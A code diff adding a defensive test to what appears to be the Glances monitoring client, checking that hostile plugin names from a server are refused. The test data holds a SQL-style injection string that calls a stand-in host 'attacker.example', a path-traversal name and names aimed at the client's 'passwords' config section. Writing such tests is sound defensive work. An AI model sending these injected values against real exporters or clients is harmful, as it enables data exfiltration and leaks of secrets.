@@ -860,3 +860,20 @@ def test_run_client_connects_to_the_port_given_with_port(tmp_path, monkeypatch, 
     )
     assert main.run_client(main.build_parser().parse_args(argv), GlancesConfig()) == 0
     assert seen == [expected]
+
+
+def test_remote_plugins_refuse_names_that_are_not_plugin_names(caplog):
+    """Security audit 2026-10-17, R-1/R-2/R-7: the server's plugin names become table,
+    topic and metric names in the exporters, and the name of a section of the
+    CLIENT's glances.conf merged into the payload. Only a plugin-looking name passes."""
+    schema = {
+        **_SCHEMA,
+        "FUNCTION url('http://attacker.example/x', Native)": {"x": {}},
+        "passwords": {"localhost": {}},
+        "influxdb": {"host": {}},
+        "amp_nginx": {"result": {}},
+        "cpu/../x": {"total": {}},
+    }
+    plugins = {p.plugin_name for p in client.remote_plugins(schema, _remote_store(), _config(), {"version"})}
+    assert plugins == {"mem", "network", "processlist"}
+    assert "ignored: not a plugin name" in caplog.text
